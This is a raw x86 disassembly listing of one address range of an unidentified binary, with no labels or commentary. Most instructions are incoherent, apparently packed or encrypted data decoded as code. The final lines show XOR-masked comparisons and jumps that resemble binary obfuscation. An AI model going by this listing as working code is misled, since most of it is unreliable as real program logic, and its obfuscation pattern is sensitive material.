  407367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407368:	pop    esp
  407369:	int    0x3c
  40736b:	hlt    
  40736c:	jle    0x407326
  40736e:	aaa    
  40736f:	cmp    BYTE PTR [esi-0x31],ah
  407372:	nop
  407373:	pusha  
  407374:	scas   eax,DWORD PTR es:[edi]
  407375:	sbb    ebp,eax
  407377:	sub    BYTE PTR [esi-0x7fff1ee4],cl
  40737d:	dec    ebx
  40737e:	jbe    0x407302
  407380:	int    0xa3
  407382:	xchg   esp,eax
  407383:	mov    dl,0x25
  407385:	mov    al,ds:0x24f71af4
  40738a:	mov    WORD PTR [eax+0x4048589a],ss
  407390:	xchg   edi,eax
  407391:	mov    bl,0xe7
  407393:	jmp    0x4073d2
  407395:	test   esi,esi
  407397:	(bad)  
  407398:	lahf   
  407399:	sub    BYTE PTR [edi],ch
  40739b:	imul   ebp,DWORD PTR [ebx],0xffffffab
  40739e:	jg     0x407334
  4073a0:	mov    WORD PTR [edx+0x3d],?
  4073a3:	cs pop ss
  4073a5:	int    0xb6
  4073a7:	xor    eax,0x153b8ed3
  4073ac:	dec    ebp
  4073ad:	cwde   
  4073ae:	mov    ebx,0xc71c3897
  4073b3:	mov    dl,0xc5
  4073b5:	test   BYTE PTR [eax+0x79cb6e93],ch
  4073bb:	ins    BYTE PTR es:[edi],dx
  4073bc:	imul   esp,DWORD PTR [eax+0x2d5bcfa7],0xffffff8c
  4073c3:	inc    esi
  4073c4:	fwait
  4073c5:	sahf   
  4073c6:	sub    edi,ebp
  4073c8:	outs   dx,DWORD PTR ds:[esi]
  4073c9:	pop    edi
  4073ca:	add    ch,BYTE PTR [ecx]
  4073cc:	push   ebx
  4073cd:	outs   dx,BYTE PTR ds:[esi]
  4073ce:	das    
  4073cf:	sbb    BYTE PTR [esi+0x72e2762f],ch
  4073d5:	imul   eax,DWORD PTR ds:0x6d0165cc,0xffffff86
  4073dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073dd:	retf   0x4b0b
  4073e0:	leave  
  4073e1:	add    al,0xc9
  4073e3:	xor    DWORD PTR ss:[ecx],ebx
  4073e6:	repz mov ebp,0x4fad3b95
  4073ec:	call   0x9e93:0xd0c41ce4
  4073f3:	mov    bl,0x4b
  4073f5:	push   edi
  4073f6:	or     DWORD PTR [ecx],ebp
  4073f8:	xchg   ebx,eax
  4073f9:	leave  
  4073fa:	gs std 
  4073fc:	pop    esi
  4073fd:	lods   eax,DWORD PTR ds:[esi]
  4073fe:	retf   
  4073ff:	lahf   
  407400:	adc    al,0x41
  407402:	mov    ecx,0xc6faedcd
  407407:	mov    cl,0xfa
  407409:	cli    
  40740a:	mov    esi,0x9d033ae0
  40740f:	and    eax,0xd3ab50d3
  407414:	idiv   BYTE PTR [ecx+0x568114d6]
  40741a:	lds    ebx,FWORD PTR [edx-0x12]
  40741d:	dec    edx
  40741e:	or     edi,0xffffffa8
  407421:	leave  
  407422:	mov    WORD PTR [edi-0x50],ss
  407425:	jns    0x4073c8
  407427:	lods   eax,DWORD PTR ds:[esi]
  407428:	je     0x407436
  40742a:	xor    ebp,DWORD PTR [ebx+0x5d]
  40742d:	cld    
  40742e:	fwait
  40742f:	out    dx,al
  407430:	ins    DWORD PTR es:[edi],dx
  407431:	pop    ss
  407432:	cmp    eax,0x4703425d
  407437:	xor    eax,0x32523474
  40743c:	jnp    0x407449
  40743e:	pop    ds
  40743f:	add    eax,DWORD PTR [ebp+0x2b86420d]
  407445:	xor    DWORD PTR [esi-0x727d5177],eax
  40744b:	cld    
  40744c:	pop    ebx
  40744d:	pop    ds
  40744e:	std    
  40744f:	mov    bl,0xe1
  407451:	or     BYTE PTR [eax-0x4b],dl
  407454:	mov    dh,BYTE PTR [edx]
  407456:	jmp    0xa85fc2ff
  40745b:	cmp    edx,ecx
  40745d:	inc    ebx
  40745e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40745f:	push   cs
  407460:	in     eax,dx
  407461:	pop    esp
  407462:	inc    esp
  407463:	mov    ebx,edx
  407465:	stos   DWORD PTR es:[edi],eax
  407466:	pop    esi
  407467:	lock aad 0xf1
  40746a:	xchg   esp,eax
  40746b:	jo     0x407480
  40746d:	sbb    eax,0x6ef7c4ef
  407472:	mov    esi,esp
  407474:	push   ecx
  407475:	stos   DWORD PTR es:[edi],eax
  407476:	mov    esi,0x8d1e3347
  40747b:	loop   0x4074ca
  40747d:	xchg   BYTE PTR [eax],ch
  40747f:	or     DWORD PTR [edi+ebp*2],ebp
  407482:	add    al,0xda
  407484:	dec    ecx
  407485:	and    ebx,ecx
  407487:	push   eax
  407488:	fimul  DWORD PTR [esi-0x49]
  40748b:	in     al,dx
  40748c:	adc    al,0x5
  40748e:	sbb    ch,BYTE PTR [ebx+0x39]
  407491:	mov    dl,0x7c
  407493:	add    eax,0x922e3f82
  407498:	shl    DWORD PTR [ebp+0x5d],cl
  40749b:	daa    
  40749c:	pop    esi
  40749d:	lds    di,DWORD PTR [eax-0x664c5e0d]
  4074a4:	data16 arpl WORD PTR [esi],di
  4074a7:	clc    
  4074a8:	enter  0xe99c,0xa4
  4074ac:	shl    BYTE PTR [ecx+0x8],1
  4074af:	out    0xa1,eax
  4074b1:	(bad)  
  4074b2:	(bad)  
  4074b3:	xor    BYTE PTR [eax],dl
  4074b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074b6:	out    0x85,al
  4074b8:	enter  0x64ec,0x8
  4074bc:	add    DWORD PTR [esi+0x27],edx
  4074bf:	stc    
  4074c0:	stc    
  4074c1:	xlat   BYTE PTR ds:[ebx]
  4074c2:	scas   al,BYTE PTR es:[edi]
  4074c3:	daa    
  4074c4:	dec    ecx
  4074c5:	dec    ebx
  4074c6:	xchg   DWORD PTR [ebp-0x44],edi
  4074c9:	push   ecx
  4074ca:	xor    BYTE PTR [edx+0x2d5bbb18],ch
  4074d0:	or     eax,0x21f9152e
  4074d5:	inc    esi
  4074d6:	push   es
  4074d7:	mov    al,0x8d
  4074d9:	sbb    dh,0xa3
  4074dc:	fdivr  DWORD PTR [ebx+0x19]
  4074df:	in     al,dx
  4074e0:	or     al,0x7
  4074e2:	sub    BYTE PTR [ecx+0x23],al
  4074e5:	and    ah,ah
  4074e7:	cmp    eax,0xd0fc23c7
  4074ec:	ds ins BYTE PTR es:[edi],dx
  4074ee:	out    0x9b,eax
  4074f0:	addr16 or eax,0x9aeca8
  4074f6:	aaa    
  4074f7:	xchg   edi,eax
  4074f8:	jae    0x4074fd
  4074fa:	rol    dl,cl
  4074fc:	jbe    0x4074d9
  4074fe:	scas   eax,DWORD PTR es:[edi]
  4074ff:	xchg   esi,eax
  407500:	ss je  0x4074a1
  407503:	test   ch,ch
  407505:	imul   edx,DWORD PTR ds:0x6cabc6b3,0xf644e023
  40750f:	sbb    BYTE PTR [esi+0x38],bl
  407512:	cld    
  407513:	jmp    0x4074df
  407515:	mov    bh,0x2c
  407517:	dec    edx
  407518:	jecxz  0x407519
  40751a:	sub    al,0xa8
  40751c:	mov    al,0x72
  40751e:	sbb    ch,BYTE PTR [ebx+0x4e]
  407521:	adc    BYTE PTR [edx+0x1a],dl
  407524:	adc    dl,bl
  407526:	ins    DWORD PTR es:[edi],dx
  407527:	fidiv  DWORD PTR [edx+ebx*4-0x46]
  40752b:	pop    ebx
  40752c:	in     al,dx
  40752d:	mov    dh,ah
  40752f:	and    ecx,DWORD PTR [ecx+edx*8-0x19]
  407533:	xchg   bh,bh
  407535:	dec    eax
  407536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407537:	xor    ch,dl
  407539:	shl    esp,1
  40753b:	test   ebp,esi
  40753d:	into   
  40753e:	lods   al,BYTE PTR ds:[esi]
  40753f:	adc    al,0x59
  407541:	mov    ch,0x21
  407543:	sbb    eax,0x5961321
  407548:	xchg   esi,eax
  407549:	loop   0x4075bd
  40754b:	mov    bh,0x99
  40754d:	sub    DWORD PTR [esi],ecx
  40754f:	cmp    al,0x93
  407551:	lea    ecx,[eax-0x7838ef74]
  407557:	iret   
  407558:	dec    esi
  407559:	push   ebx
  40755a:	jmp    0x407533
  40755c:	sub    eax,0x9ce4297a
  407561:	loopne 0x407503
  407563:	xor    al,0xdc
  407565:	rcl    DWORD PTR [edx],0x24
  407568:	aaa    
  407569:	xchg   DWORD PTR [eax],eax
  40756b:	inc    edx
  40756c:	jmp    0x40758c
  40756e:	test   BYTE PTR [ecx+0x5a],dh
  407571:	jns    0x4075ac
  407573:	icebp  
  407574:	or     ebp,ebp
  407576:	push   edx
  407577:	mov    cl,0x6e
  407579:	test   bl,bh
  40757b:	inc    eax
  40757c:	and    ecx,DWORD PTR [ecx]
  40757e:	push   eax
  40757f:	stos   BYTE PTR es:[edi],al
  407580:	loope  0x407562
  407582:	jg     0x4075e9
  407584:	scas   al,BYTE PTR es:[edi]
  407585:	sub    al,0xc3
  407587:	sbb    BYTE PTR [ecx],dh
  407589:	scas   eax,DWORD PTR es:[edi]
  40758a:	jp     0x4075b3
  40758c:	out    0x4a,eax
  40758e:	and    DWORD PTR [edi-0x273587ab],ebp
  407594:	ret    
  407595:	adc    eax,0xcb6f2e80
  40759a:	jbe    0x40754b
  40759c:	jo     0x40758f
  40759e:	mov    ds,WORD PTR ds:0xb96a37b4
  4075a4:	inc    ebp
  4075a5:	fsub   st(6),st
  4075a7:	sbb    eax,DWORD PTR [eax-0x66b568b]
  4075ad:	dec    esp
  4075ae:	std    
  4075af:	dec    dh
  4075b1:	add    bh,BYTE PTR [eax]
  4075b3:	lea    ebp,[ebx]
  4075b5:	and    eax,0x44240cc9
  4075ba:	xchg   ebx,eax
  4075bb:	mov    edx,0xa568ad30
  4075c0:	xlat   BYTE PTR ds:[ebx]
  4075c1:	fcmovbe st,st(7)
  4075c3:	dec    ecx
  4075c4:	or     DWORD PTR [edx-0x77fa1f83],0xfffffff7
  4075cb:	add    al,0xd2
  4075cd:	inc    ecx
  4075ce:	mov    es,WORD PTR [esi]
  4075d0:	add    BYTE PTR [ebx],ah
  4075d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075d3:	loop   0x407598
  4075d5:	loop   0x4075dd
  4075d7:	jne    0x4075fc
  4075d9:	push   ebp
  4075da:	out    dx,eax
  4075db:	adc    BYTE PTR ds:0x3c51abed,dl
  4075e1:	fcmovb st,st(3)
  4075e3:	xor    BYTE PTR [edx+0x55],0x90
  4075e7:	xor    ebp,DWORD PTR [edx]
  4075e9:	int3   
  4075ea:	dec    esi
  4075eb:	jnp    0x4075f8
  4075ed:	pusha  
  4075ee:	sub    al,0xe3
  4075f0:	loop   0x4075bf
  4075f2:	outs   dx,DWORD PTR ds:[esi]
  4075f3:	fst    DWORD PTR [ecx]
  4075f5:	retf   
  4075f6:	dec    esi
  4075f7:	sbb    cl,BYTE PTR [eax+edx*1]
  4075fa:	jecxz  0x4075d9
  4075fc:	or     BYTE PTR [edx-0x3f67c64e],dl
  407602:	add    al,0x93
  407604:	lock fbstp TBYTE PTR [ebx-0x62f159c8]
  40760b:	into   
  40760c:	cmc    
  40760d:	pop    ecx
  40760e:	shr    DWORD PTR [esi-0x13],1
  407611:	or     DWORD PTR [edi],ebx
  407613:	(bad)  
  407614:	pop    ebx
  407615:	mov    bl,0xf1
  407617:	or     al,0xd7
  407619:	and    cl,0xa3
  40761c:	mov    ah,0x41
  40761e:	sbb    DWORD PTR [ebp-0x1fa6a9ca],esi
  407624:	mov    esi,0xf4c6cad1
  407629:	out    0x26,eax
  40762b:	and    al,0x43
  40762d:	xchg   edi,eax
  40762e:	leave  
  40762f:	and    eax,0x632bfbae
  407634:	icebp  
  407635:	cmp    eax,0x262efb91
  40763a:	xchg   esi,eax
  40763b:	ja     0x4075f9
  40763d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40763e:	push   0x557bd140
  407643:	lds    edi,FWORD PTR [ebx-0x17]
  407646:	scas   eax,DWORD PTR es:[edi]
  407647:	mov    ds:0x34b397cb,eax
  40764c:	lods   eax,DWORD PTR ds:[esi]
  40764d:	popa   
  40764e:	dec    eax
  40764f:	push   edx
  407650:	push   ecx
  407651:	mov    BYTE PTR [ebp+0x32469614],0x24
  407658:	or     ah,dh
  40765a:	push   edx
  40765b:	pop    ds
  40765c:	je     0x4076da
  40765e:	and    ebp,eax
  407660:	shl    BYTE PTR [edi+edi*8-0x77746a9],0x85
  407668:	adc    DWORD PTR [eax-0x25271fd0],esi
  40766e:	sub    esi,esp
  407670:	cwde   
  407671:	push   0xb0f175d7
  407676:	ret    0x41bb
  407679:	stos   DWORD PTR es:[edi],eax
  40767a:	repnz (bad) 
  40767c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40767d:	(bad)  
  40767e:	mov    esi,0xb9ea3bff
  407683:	sbb    BYTE PTR [edi-0x35],cl
  407686:	out    0x99,eax
  407688:	or     al,0x72
  40768a:	mov    ebp,0x26e193e7
  40768f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407690:	adc    DWORD PTR [ebp-0x55],edi
  407693:	mov    ds:0xf52db542,eax
  407698:	in     al,dx
  407699:	or     edi,DWORD PTR [esi]
  40769b:	dec    ecx
  40769c:	sbb    al,0xf2
  40769e:	adc    al,0x56
  4076a0:	mov    ecx,DWORD PTR ds:0x2d4edc16
  4076a6:	mov    edx,0x44d237b6
  4076ab:	push   ss
  4076ac:	dec    esi
  4076ad:	xor    dl,BYTE PTR [ebp-0x4bd87b7]
  4076b3:	fwait
  4076b4:	add    eax,0x195fbe9b
  4076b9:	xchg   esi,eax
  4076ba:	(bad)  
  4076bc:	std    
  4076bd:	test   DWORD PTR [ecx],edi
  4076bf:	xor    edi,DWORD PTR [ebx]
  4076c1:	pusha  
  4076c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076c3:	mov    edx,0xe48884fe
  4076c8:	ret    
  4076c9:	mov    ebx,0x516ced9
  4076ce:	push   ds
  4076cf:	mov    BYTE PTR [ebx-0x367c267],dh
  4076d5:	shl    BYTE PTR [ebx-0x38],1
  4076d8:	out    dx,al
  4076d9:	es fdiv st(7),st
  4076dc:	scas   al,BYTE PTR es:[edi]
  4076dd:	dec    ebx
  4076de:	jne    0x4076d4
  4076e0:	lahf   
  4076e1:	xlat   BYTE PTR ds:[ebx]
  4076e2:	sahf   
  4076e3:	fcom   QWORD PTR [edx-0x50]
  4076e6:	push   edx
  4076e7:	push   ss
  4076e8:	push   ebx
  4076e9:	cwde   
  4076ea:	mov    edx,0xd293dfd4
  4076ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f0:	mov    bh,0x6b
  4076f2:	lds    esp,FWORD PTR [edx+0x7fc1227e]
  4076f8:	jecxz  0x4076af
  4076fa:	and    eax,0xa6e9df62
  4076ff:	and    DWORD PTR [ebx],esi
  407701:	push   ebp
  407702:	imul   ebp,esp,0xaa6dbad1
  407708:	mov    ah,0xba
  40770a:	push   edx
  40770b:	lods   al,BYTE PTR ds:[esi]
  40770d:	pushf  
  40770e:	test   cl,bh
  407710:	jbe    0x4076bf
  407712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407713:	mov    ch,0xe9
  407715:	cmp    al,0xde
  407717:	and    ch,dh
  407719:	rep outs dx,DWORD PTR ds:[esi]
  40771b:	jg     0x4076a7
  40771d:	bswap  eax
  40771f:	mov    cl,0x38
  407721:	cli    
  407722:	repnz into 
  407724:	inc    eax
  407725:	or     ebp,edx
  407727:	into   
  407728:	(bad)  
  407729:	bound  edi,QWORD PTR [esi]
  40772b:	pop    edi
  40772c:	dec    ebp
  40772d:	add    al,0x74
  40772f:	in     eax,dx
  407730:	das    
  407731:	loopne 0x407785
  407733:	sub    DWORD PTR [esi-0x34],0x19
  407737:	mov    BYTE PTR [esi-0xf],ch
  40773a:	out    dx,al
  40773b:	fs sbb eax,0xba0b641e
  407741:	dec    ebp
  407742:	xchg   dh,al
  407744:	jmp    0xf09c6b2e
  407749:	aam    0xd4
  40774b:	adc    DWORD PTR [edi-0xc542ac9],ecx
  407751:	cwde   
  407752:	scas   eax,DWORD PTR es:[edi]
  407753:	adc    BYTE PTR [ebp+0x29],0x3d
  407757:	fimul  DWORD PTR [edx+0x5b4e9cfa]
  40775d:	cmp    DWORD PTR [ecx-0x67cce8e5],edx
  407763:	xor    ebp,ebp
  407765:	jnp    0x4077d0
  407767:	out    dx,eax
  407768:	or     DWORD PTR [ebx+esi*4-0x7cb2b0],edi
  40776f:	(bad)  
  407770:	clc    
  407771:	outs   dx,BYTE PTR ds:[esi]
  407772:	test   esi,eax
  407774:	dec    esp
  407775:	sbb    al,0x34
  407777:	dec    edx
  407778:	xor    DWORD PTR [eax+0x74],esp
  40777b:	jns    0x407711
  40777d:	xor    dl,BYTE PTR [eax]
  40777f:	pusha  
  407780:	xchg   DWORD PTR [ebp+0x76fe9419],edx
  407786:	out    dx,eax
  407787:	add    DWORD PTR [ecx+0x768cbd91],edi
  40778d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40778e:	fwait
  40778f:	out    dx,eax
  407790:	arpl   WORD PTR [edi-0x1b],bp
  407793:	jno    0x4077c1
  407795:	das    
  407796:	cmp    eax,esp
  407798:	mov    dh,0xa7
  40779a:	rcl    ah,cl
  40779c:	jb     0x40779d
  40779e:	das    
  40779f:	rcl    ebp,cl
  4077a1:	mov    ch,0x10
  4077a3:	ss xchg ebx,eax
  4077a5:	xlat   BYTE PTR ds:[ebx]
  4077a6:	inc    ebp
  4077a7:	mov    WORD PTR [esi-0xb],fs
  4077aa:	jge    0x407821
  4077ac:	popf   
  4077ad:	xor    BYTE PTR [edx+0x53],bh
  4077b0:	sub    ecx,esi
  4077b2:	inc    ecx
  4077b3:	out    dx,eax
  4077b4:	div    BYTE PTR [ebx-0x123e2ca4]
  4077ba:	add    al,BYTE PTR [eax+0x36eb2aed]
  4077c0:	jge    0x407800
  4077c2:	add    eax,0x6f62ad94
  4077c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c8:	sahf   
  4077c9:	add    edx,DWORD PTR [eax+0x46]
  4077cc:	mov    eax,0xc02dd2f7
  4077d1:	rol    BYTE PTR [edx+eax*4+0x28],1
  4077d5:	pushf  
  4077d6:	adc    eax,0xe9394ba9
  4077db:	aad    0x8a
  4077dd:	pop    edx
  4077de:	imul   edx,DWORD PTR [ebx+edx*8],0x4494c193
  4077e5:	stos   BYTE PTR es:[edi],al
  4077e6:	sbb    al,0x7d
  4077e8:	add    DWORD PTR [ebx+0x26],0x43
  4077ec:	fidivr DWORD PTR [ecx]
  4077ee:	push   esi
  4077ef:	xor    esp,ebx
  4077f1:	lds    esi,FWORD PTR [eax+0x47dcedc1]
  4077f7:	pop    ds
  4077f8:	into   
  4077f9:	in     eax,dx
  4077fa:	push   ecx
  4077fb:	push   edx
  4077fc:	sti    
  4077fd:	adc    eax,0x58fd7fac
  407802:	(bad)  
  407803:	cmp    ebp,DWORD PTR [eax-0x1d]
  407806:	aad    0x46
  407808:	clc    
  407809:	xor    eax,0x3d350cab
  40780e:	push   cs
  40780f:	inc    eax
  407810:	out    0xd3,eax
  407812:	mov    ebp,0x888290eb
  407817:	cmc    
  407818:	jne    0x4077a4
  40781a:	inc    ebx
  40781b:	sub    BYTE PTR [edi-0x64e4871f],0x27
  407822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407823:	xor    bl,BYTE PTR [esi-0x7b]
  407826:	das    
  407827:	sub    DWORD PTR [ebx+0x6d],esp
  40782a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40782b:	xchg   edi,eax
  40782c:	aad    0x75
  40782e:	mov    WORD PTR [esi-0x21b43f7e],cs
  407834:	sub    BYTE PTR [ecx+ebp*1-0x7d608e4f],0x60
  40783c:	stc    
  40783d:	add    ecx,esp
  40783f:	cmc    
  407840:	cmp    al,0x37
  407842:	dec    esp
  407843:	repz (bad) 
  407845:	mov    esi,0xb887cb88
  40784a:	add    DWORD PTR [ebx],0xa499a508
  407850:	fsubr  QWORD PTR [ebx]
  407852:	es jecxz 0x407810
  407855:	jg     0x4078ae
  407857:	jne    0x40785a
  407859:	pop    es
  40785a:	ret    0xe088
  40785d:	out    0x2b,eax
  40785f:	jl     0x4078dc
  407861:	and    dh,BYTE PTR [eax+ebx*8-0x5a]
  407865:	push   ds
  407866:	jg     0x4078c3
  407868:	ins    BYTE PTR es:[edi],dx
  407869:	dec    esi
  40786a:	mov    ebx,0x441d01a
  40786f:	scas   al,BYTE PTR es:[edi]
  407870:	sub    DWORD PTR [edi],edx
  407872:	mov    ecx,0xa947f4fe
  407877:	inc    ecx
  407878:	stc    
  407879:	jp     0x40783a
  40787b:	shl    DWORD PTR [esp+eax*1],0x4d
  40787f:	test   bh,cl
  407881:	mov    DWORD PTR [ebx-0x1f47db5a],edi
  407887:	js     0x4078bc
  407889:	mov    ebx,0x8d1a65d6
  40788e:	retf   
  40788f:	jge    0x40785c
  407891:	and    ebx,edi
  407893:	inc    esi
  407894:	push   edi
  407895:	mov    cl,0xf2
  407897:	icebp  
  407898:	pushf  
  407899:	call   0xcfb8:0x88189af
  4078a0:	in     eax,0x2d
  4078a2:	cld    
  4078a3:	mov    eax,ds:0x13d29d7b
  4078a8:	in     eax,0x55
  4078aa:	pop    edx
  4078ab:	pop    ds
  4078ac:	cmp    bh,BYTE PTR [esi+edi*1]
  4078af:	jp     0x407869
  4078b1:	test   DWORD PTR [ecx+0x50],edi
  4078b4:	and    al,BYTE PTR [esi-0x3b]
  4078b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078b8:	mov    ch,0xca
  4078ba:	mov    esp,0x7012c3db
  4078bf:	mov    dl,0x39
  4078c1:	jne    0x407919
  4078c3:	out    dx,al
  4078c4:	mov    cl,0x83
  4078c6:	or     al,0x24
  4078c8:	mov    ebx,0xeebf2ef5
  4078cd:	dec    ecx
  4078ce:	pop    edx
  4078cf:	out    dx,eax
  4078d0:	xor    DWORD PTR [eax+esi*4],edi
  4078d3:	jle    0x407882
  4078d5:	nop
  4078d6:	pusha  
  4078d7:	push   ebx
  4078d8:	add    ah,0x78
  4078db:	adc    dl,BYTE PTR [ebx-0x1b]
  4078de:	loop   0x407924
  4078e0:	add    ecx,DWORD PTR [edi+0x3e008ef5]
  4078e6:	push   cs
  4078e7:	aad    0x47
  4078e9:	addr16 icebp 
  4078eb:	icebp  
  4078ec:	lods   al,BYTE PTR ds:[esi]
  4078ed:	xchg   esp,eax
  4078ee:	adc    ebx,DWORD PTR [edi]
  4078f0:	jno    0x407935
  4078f2:	jg     0x4078b1
  4078f4:	mov    ecx,0x51eb9c51
  4078f9:	lods   eax,DWORD PTR ds:[esi]
  4078fa:	jg     0x4078b8
  4078fc:	out    0xc9,al
  4078fe:	xor    al,0x2b
  407900:	es mov ch,0x5a
  407903:	xchg   DWORD PTR [eax+ebx*4-0x5f010771],edx
  40790a:	jne    0x4078d1
  40790c:	sbb    eax,0x63367250
  407911:	and    DWORD PTR [esi],eax
  407913:	shr    DWORD PTR [esi+0x61],0x79
  407917:	pop    ebp
  407918:	leave  
  407919:	call   0xa7261649
  40791e:	dec    ebp
  40791f:	retf   0xb00
  407922:	mov    dl,0xe3
  407924:	in     al,dx
  407925:	add    esp,edi
  407927:	test   BYTE PTR [eax+ecx*1+0x1a],bh
  40792b:	ret    
  40792c:	pop    edi
  40792d:	fstp   DWORD PTR [eax-0x13df0852]
  407933:	cwde   
  407934:	lock std 
  407936:	or     eax,0xd20faa6a
  40793b:	pop    ss
  40793c:	cmc    
  40793d:	popw   ss
  40793f:	cs dec edi
  407941:	jb     0x4079a3
  407943:	jmp    0xf8bd05de
  407948:	fisttp DWORD PTR [ebx-0x12]
  40794b:	gs mov bl,0xbb
  40794e:	loop   0x4078e2
  407950:	fbstp  TBYTE PTR [esi]
  407952:	push   esi
  407953:	retf   0x1629
  407956:	sar    DWORD PTR [edi],cl
  407958:	es fxam 
  40795b:	pop    esi
  40795c:	push   edx
  40795d:	add    ch,0x6b
  407960:	ds mov bl,0x76
  407963:	sbb    ecx,edi
  407965:	pop    esi
  407966:	jp     0x4079cf
  407968:	ficom  DWORD PTR [edx+0x7b110323]
  40796e:	push   edi
  40796f:	adc    al,0xaf
  407971:	sub    DWORD PTR [edx],esi
  407973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407974:	jnp    0x407980
  407976:	pop    edi
  407977:	sub    esi,DWORD PTR [edx+0x3349bf9a]
  40797d:	mov    dl,0x78
  40797f:	ror    BYTE PTR ds:0xf3e6a50a,1
  407985:	fmul   DWORD PTR [ebp+0xadd2a97]
  40798b:	mov    bh,0xb7
  40798d:	dec    esp
  40798e:	and    al,ah
  407990:	int3   
  407991:	loopne 0x4079b1
  407993:	pop    edi
  407994:	cmc    
  407995:	adc    eax,0xc8f816ee
  40799a:	cdq    
  40799b:	enter  0xb66b,0x4b
  40799f:	and    cl,0x1e
  4079a2:	leave  
  4079a3:	push   ss
  4079a4:	mov    cl,0xc4
  4079a6:	lea    edi,[ebx+0x72]
  4079a9:	mov    ds:0xc81e8039,al
  4079ae:	in     al,0x5a
  4079b0:	inc    edi
  4079b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079b2:	sbb    ch,BYTE PTR [eax+edi*1]
  4079b5:	push   ebx
  4079b6:	push   ds
  4079b7:	mov    BYTE PTR [edx],dl
  4079b9:	xor    al,0x89
  4079bb:	add    ah,ch
  4079bd:	ret    
  4079be:	mov    dh,0xd8
  4079c0:	xlat   BYTE PTR ds:[ebx]
  4079c1:	mov    ah,0xe9
  4079c3:	mov    edx,0xb341ce72
  4079c8:	jo     0x4079a4
  4079ca:	sbb    bh,BYTE PTR [esi+0x4a3d475a]
  4079d0:	xchg   DWORD PTR [esi+0x5d7050e],ebp
  4079d6:	xchg   esi,eax
  4079d7:	jmp    0xd321a11
  4079dc:	xor    BYTE PTR [edi+0x23fe4101],dl
  4079e2:	and    ebx,DWORD PTR [ebx]
  4079e4:	es push ebx
  4079e6:	mov    al,ds:0x95b4c3d6
  4079eb:	push   esp
  4079ec:	jge    0x407a62
  4079ee:	scas   al,BYTE PTR es:[edi]
  4079ef:	outs   dx,BYTE PTR ds:[esi]
  4079f0:	fsub   DWORD PTR [ebp+0x1516fdcf]
  4079f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f7:	(bad)  
  4079f8:	stc    
  4079f9:	outs   dx,DWORD PTR ds:[esi]
  4079fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079fb:	and    al,dh
  4079fd:	inc    edi
  4079fe:	test   DWORD PTR [ecx-0x7f],0xc97b1dd7
  407a05:	push   ebx
  407a06:	jb     0x407a44
  407a08:	(bad)  
  407a0a:	jae    0x4079fd
  407a0c:	push   0xdfe8acd5
  407a11:	shr    DWORD PTR [edi+0x7c],0x53
  407a15:	add    eax,0x8a8d6439
  407a1a:	int    0xaf
  407a1c:	clc    
  407a1d:	and    eax,0xa37a61f4
  407a22:	mov    al,ds:0x74b7a02b
  407a27:	mov    BYTE PTR [ebp-0x48],dh
  407a2a:	cs inc ebx
  407a2c:	clc    
  407a2d:	call   0x5cc23ba1
  407a32:	call   0x44dccb1
  407a37:	inc    ebx
  407a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a39:	out    0x5f,al
  407a3b:	adc    al,0x56
  407a3d:	cli    
  407a3e:	pushf  
  407a3f:	xchg   edx,eax
  407a40:	lock mov dh,0x4a
  407a43:	mov    ecx,0xfc4d8b98
  407a48:	mov    edx,DWORD PTR [ebp-0x30]
  407a4b:	xor    ecx,ebx
  407a4d:	add    ecx,eax
  407a4f:	cmp    edx,ecx
  407a51:	je     0x407abe
  407a57:	lea    eax,[ebp-0x8]
  407a5a:	push   eax
  407a5b:	push   DWORD PTR [ebp-0x28]
  407a5e:	push   DWORD PTR [ebp+0xc]
  407a61:	call   0x40f238
  407a66:	mov    eax,0x3272dd
  407a6b:	mov    ecx,DWORD PTR [ebp-0x4]
  407a6e:	mov    edx,DWORD PTR [ebp-0x8]
  407a71:	xor    ecx,ebx
  407a73:	add    ecx,eax
  407a75:	cmp    edx,ecx
  407a77:	je     0x407a92
  407a7d:	mov    ecx,DWORD PTR [ebp-0x34]
  407a80:	movzx  ecx,WORD PTR [ecx+esi*2]
  407a84:	mov    edx,DWORD PTR [ebp-0x18]
  407a87:	mov    ecx,DWORD PTR [edx+ecx*4]
  407a8a:	mov    DWORD PTR [ebp-0x38],ecx
  407a8d:	jmp    0x4056db
  407a92:	mov    ecx,DWORD PTR [ebp-0x14]
  407a95:	xor    ecx,ebx
  407a97:	lea    esi,[esi+ecx*1+0x3272dd]
  407a9e:	jmp    0x40540c
  407aa3:	mov    eax,DWORD PTR [ebp-0x4]
  407aa6:	xor    eax,ebx
  407aa8:	add    eax,edi
  407aaa:	jmp    0x409f7a
  407aaf:	mov    eax,DWORD PTR [ebp-0x4]
  407ab2:	xor    eax,ebx
  407ab4:	add    eax,0x3272dd
  407ab9:	jmp    0x409f7a
  407abe:	mov    ecx,DWORD PTR [ebp-0x38]
  407ac1:	add    ecx,DWORD PTR [ebp+0x8]
  407ac4:	mov    DWORD PTR [ebp-0x10],ecx
  407ac7:	mov    ecx,DWORD PTR [ebp-0x1c]
  407aca:	test   ecx,ecx
  407acc:	je     0x409f05
  407ad2:	mov    DWORD PTR [ebp-0x20],0x0
  407ad9:	push   0x3
  407adb:	xor    edx,edx
  407add:	pop    edx
  407ade:	add    edx,0x8
  407ae1:	push   edx
  407ae2:	pop    ecx
  407ae3:	push   0x6
